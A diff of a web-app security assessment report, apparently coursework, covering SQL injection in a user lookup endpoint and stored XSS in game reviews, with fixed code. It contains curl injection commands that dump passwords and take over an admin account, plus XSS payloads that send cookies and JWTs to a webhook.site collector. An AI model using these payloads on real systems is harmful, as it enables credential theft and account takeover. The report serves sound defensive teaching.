@@ -143,126 +143,232 @@ var getUserSql = `select userid, username, email, type, profile_pic_url,
 Additionally, protect the endpoint with `verifyToken` and restrict to admin users only.
 
 **Best Secure Coding Practice:** Never expose internal user IDs or credentials in API responses. Apply the principle of data minimization — only return fields the client legitimately needs.
-
 --- 
 ## A03 — Injection (Detailed)
 
 ### Finding 1: SQL Injection in `GET /users/:userid`
 
-**Type of flaw:** SQL Injection caused by unsafe string interpolation in the database query.
+**Type of flaw:** SQL Injection — unsafe string interpolation allows attacker-controlled input to manipulate the database query structure.
 
 **Location:**
-- `Assignment/BackEndServer/controller/app.js:308-320`
-- `Assignment/BackEndServer/model/users.js:87-103`
+- `Assignment/BackEndServer/controller/app.js` lines 308–320
+- `Assignment/BackEndServer/model/users.js` lines 87–103
 
 **Vulnerable code snippet:**
 
 ```javascript
-// controller/app.js
+// controller/app.js — userid taken from URL with no validation
 app.get('/users/:userid', function (req, res) {
     var userid = req.params.userid;
 
     userDB.getUserByUserid(userid, function (err, results) {
-        ...
+        if (err) {
+            console.log(err);
+            res.status(500).send(err);
+        } else {
+            res.status(200).send(results);
+        }
     });
 });
 ```
 
 ```javascript
-// model/users.js
+// model/users.js — userid dropped directly into the SQL string
 var getUserByUserIDSql = `select userid, username, email, password, type, profile_pic_url,
-                            DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at FROM users where userid = ${userid};`;
+                            DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
+                          FROM users where userid = ${userid};`;
 ```
 
 **Why this is vulnerable:**
-The `userid` value from the URL is inserted directly into the SQL statement without parameterization or validation. Because the value is treated as part of the SQL text, an attacker can manipulate the query structure and attempt to retrieve data outside the intended record.
+The `userid` value from the URL path parameter is inserted directly into the SQL string using a template literal (`${userid}`) without any parameterization, type validation, or sanitization. The value is treated as raw SQL text, so an attacker can supply SQL syntax and alter the structure of the query. The endpoint is also entirely public — it requires no authentication token.
 
 **How it can be exploited:**
-This endpoint is public and does not require authentication. An attacker can supply crafted input such as `1 OR 1=1` or other SQL syntax in the `userid` path parameter to try to change the query behavior. If the database accepts the payload, the response may reveal unintended user records.
-<img src="../Assets/Mike/get-users-poc.png" alt="GET /users/:userid proof of concept request">
 
-<img src="../Assets/Mike/get-users-code.png" alt="GET /users/:userid vulnerable code">
+**Step 1 — Confirm the injection point (force a SQL error):**
+
+Sending a single quote breaks the SQL syntax. The server returns a raw MySQL error, confirming input is interpreted as SQL:
+```bash
+curl "http://localhost:8081/users/'"
+```
+Expected response: HTTP 500 with a MySQL syntax error leaking internal query structure.
+
+**Step 2 — Dump all users with a tautology:**
+```bash
+curl "http://localhost:8081/users/1%20OR%201=1"
+```
+Resulting SQL:
+```sql
+SELECT userid, username, email, password, type, profile_pic_url, ...
+FROM users WHERE userid = 1 OR 1=1;
+```
+Every row is returned — including all plain-text passwords.
+
+**Step 3 — Target a specific account by email:**
+```bash
+curl "http://localhost:8081/users/1%20OR%20email='admin@example.com'"
+```
+
+**Step 4 — Full account takeover chain:**
+
+With passwords from Step 2, the attacker replays credentials against the login endpoint:
+```bash
+curl -X POST http://localhost:8081/users/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@example.com","password":"dumped_password"}'
+```
+The server returns a valid JWT token granting full admin access.
 
 **Impact:**
-- Unauthorized access to user data
-- Exposure of usernames, emails, passwords, and profile information
-- Possible account compromise if exposed credentials are reused
-- Loss of confidentiality and trust in the application
+- All user records including plain-text passwords exposed to any unauthenticated attacker
+- Immediate account takeover without any cracking step
+- Admin credentials may be among the exposed records, enabling full application compromise
+- Breach of user confidentiality
+
+**Tools used:** Manual code review, browser navigation to injected URL, Postman for structured payload testing
 
 **Recommendation:**
-Use a parameterized query instead of string interpolation. The endpoint should also be protected by authentication and authorization checks so users can only access records they are allowed to see.
+Use a parameterized query. Also protect the endpoint with authentication middleware and remove `password` from the `SELECT` statement.
 
 **Fixed code:**
 
 ```javascript
+// model/users.js — parameterized query, password removed from SELECT
 var getUserByUserIDSql = `
     SELECT userid, username, email, type, profile_pic_url,
            DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') AS created_at
     FROM users
     WHERE userid = ?;
 `;
-
 dbConn.query(getUserByUserIDSql, [userid], function (err, results) {
-    ...
+    dbConn.end();
+    if (err) { return callback(err, null); }
+    return callback(null, results);
 });
 ```
 
-**Best Secure Coding Practice:**
-Always use prepared statements or parameterized queries for database access. Never concatenate user input into SQL strings. Combine this with access control checks so users can only access their own records unless they have explicit admin privileges.
-
-
---- 
-## A03 — Injection (Brief)
-
-### Finding 2: SQL Injection in `POST /game`
-<img src="../Assets/Mike/insertgame-request.png" alt="POST /game proof of concept request">
-<img src="../Assets/Mike/insertgame-error.png" alt="POST /game server error response">
-
-**Type of flaw:** SQL Injection caused by unsafe string interpolation in the game creation query.
-
-**Location:**
-- `Assignment/BackEndServer/controller/app.js:435-471`
-- `Assignment/BackEndServer/model/game.js:153-160`
-
-**Vulnerable code snippet:**
-
 ```javascript
-// controller/app.js
-app.post('/game', upload.single('game_image'), function (req, res) {
-    var title = req.body.title;
-    var game_description = req.body.description;
-    var year = req.body.year;
-    var game_image = req.file;
-
-    gameDB.insertGame(title, game_description, year, game_image, function (err, results) {
-        ...
+// controller/app.js — validate userid is an integer, add auth middleware
+app.get('/users/:userid', verifyToken, function (req, res) {
+    var userid = parseInt(req.params.userid, 10);
+    if (isNaN(userid)) {
+        return res.status(400).json({ error: 'Invalid user ID' });
+    }
+    userDB.getUserByUserid(userid, function (err, results) {
+        if (err) { res.status(500).send('Internal server error'); }
+        else { res.status(200).send(results); }
     });
 });
 ```
 
+**Best Secure Coding Practices:**
+- Always use parameterized queries or prepared statements. Never interpolate user input into SQL strings.
+- Validate and type-check all inputs at the controller layer before they reach the model. A `userid` should always be coerced to an integer and rejected if not a valid number.
+- Apply authentication middleware to endpoints that return user data and enforce that a user can only access their own record unless they hold the Admin role.
+- Remove sensitive columns such as `password` from `SELECT` statements in any query whose results are sent to the client.
+
+---
+
+## A03 — Injection (Brief)
+
+### Finding 2: Stored XSS via Review Content Rendered into `innerHTML`
+
+**Type of flaw:** Stored Cross-Site Scripting (XSS) — user-supplied review content is persisted to the database and later inserted into the DOM without sanitization, allowing injected scripts to execute in every visitor's browser.
+
+**Location:**
+- `Assignment/FrontEndServer/Public/newGame-Detail.html` lines 92–103 (`renderReviews` function)
+- `Assignment/BackEndServer/controller/app.js` — `POST /users/:uid/game/:gid/review` (no input validation on `content`)
+
+**Vulnerable code snippet:**
+
 ```javascript
-// model/game.js
-var insertGameSql = `INSERT INTO game (title, game_description, year, game_image) VALUES ('${title}', '${game_description}', '${year}', ?);`;
+// newGame-Detail.html — renderReviews()
+function renderReviews(reviews) {
+    reviews.forEach(r => {
+        const div = document.createElement('div');
+        div.innerHTML = `
+            <strong>${r.username || 'User'}</strong>
+            <div class="muted small">${r.created_at || ''} • Rating: ${r.rating || ''}</div>
+            <p class="mt-2">${r.content || ''}</p>
+        `;
+        out.appendChild(div);
+    });
+}
 ```
 
-<img src="../Assets/Mike/insertgame-code.png" alt="POST /game vulnerable code">
+`r.content` is retrieved from the database and inserted directly into `innerHTML` with no escaping. Any HTML or script tags stored in the database will be interpreted and executed by the browser.
 
-**Impact:** The `title`, `game_description`, and `year` fields are copied directly into the SQL statement. If an attacker submits crafted values, the database query can be altered or broken, which can corrupt game data or cause unexpected behavior.
+**Impact:** An attacker submits a review via Postman with escalating payloads in the `content` field:
+
+**Basic confirmation:**
+```json
+{ "content": "<script>alert('XSS')</script>", "rating": 5 }
+```
+
+**Cookie steal:**
+```json
+{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?c='+document.cookie)\">", "rating": 5 }
+```
+
+**JWT token steal (most impactful):**
+```json
+{ "content": "<img src=x onerror=\"fetch('https://webhook.site/YOUR-ID?t='+localStorage.getItem('Token'))\">", "rating": 5 }
+```
+
+The JWT steal is the strongest demo: open [webhook.site](https://webhook.site), paste your URL into the payload, submit the review, then visit the game page logged in as a victim in another tab. The victim's JWT arrives at webhook.site in real time — paste it into Postman as `Authorization: Bearer <token>` for immediate account takeover. Because the payload is stored in the database, this is a **persistent** attack affecting every future visitor.
+
+**Recommendation:**
+Replace `innerHTML` with DOM methods that set text via `textContent`. Unlike `innerHTML`, `textContent` never interprets its value as HTML — injected tags cannot execute regardless of what the database contains.
 
 **Fixed code:**
 
 ```javascript
-var insertGameSql = `
-    INSERT INTO game (title, game_description, year, game_image)
-    VALUES (?, ?, ?, ?)
-`;
+// Updated renderReviews — textContent used for all dynamic values
+function renderReviews(reviews) {
+    const out = document.getElementById('reviewDisplaySection');
+    out.innerHTML = '';
+    reviews.forEach(r => {
+        const div = document.createElement('div');
+        div.className = 'card p-3 mb-3';
 
-dbConn.query(insertGameSql, [title, game_description, year, game_image.buffer], function (err, results) {
-    ...
-});
+        const wrapper = document.createElement('div');
+        wrapper.className = 'd-flex gap-3';
+
+        const img = document.createElement('img');
+        img.src = 'data:image/jpeg;base64,' + (r.profile_pic_url || '');
+        img.style.cssText = 'width:64px;height:64px;object-fit:cover;border-radius:50%';
+        img.alt = 'user';
+
+        const info = document.createElement('div');
+
+        const strong = document.createElement('strong');
+        strong.textContent = r.username || 'User';
+
+        const meta = document.createElement('div');
+        meta.className = 'muted small';
+        meta.textContent = (r.created_at || '') + ' • Rating: ' + (r.rating || '');
+
+        const content = document.createElement('p');
+        content.className = 'mt-2';
+        content.textContent = r.content || '';
+
+        info.appendChild(strong);
+        info.appendChild(meta);
+        info.appendChild(content);
+        wrapper.appendChild(img);
+        wrapper.appendChild(info);
+        div.appendChild(wrapper);
+        out.appendChild(div);
+    });
+}
 ```
 
-**Best Secure Coding Practice:** Use parameterized queries for every database write operation and validate incoming form fields before they reach the model layer.
+With this fix, a payload like `<img src=x onerror="...">` stored in `r.content` is displayed as literal text — the browser never parses it as HTML.
+
+**Best Secure Coding Practices:**
+- Use `textContent` instead of `innerHTML` whenever displaying plain text. It is safe by default and requires no escaping — the browser cannot interpret anything set via `textContent` as markup.
+- Treat all data retrieved from the database as untrusted. It passed through user input at some point and may contain malicious content.
+- Validate and sanitize user input at the backend before storage. The review submission endpoint should strip or reject HTML tags before writing to the database, providing defence-in-depth on top of the frontend fix.
+- Implement a Content Security Policy (CSP) header as an additional layer so that even a missed fix cannot allow scripts to exfiltrate data.
 
 
 --- 
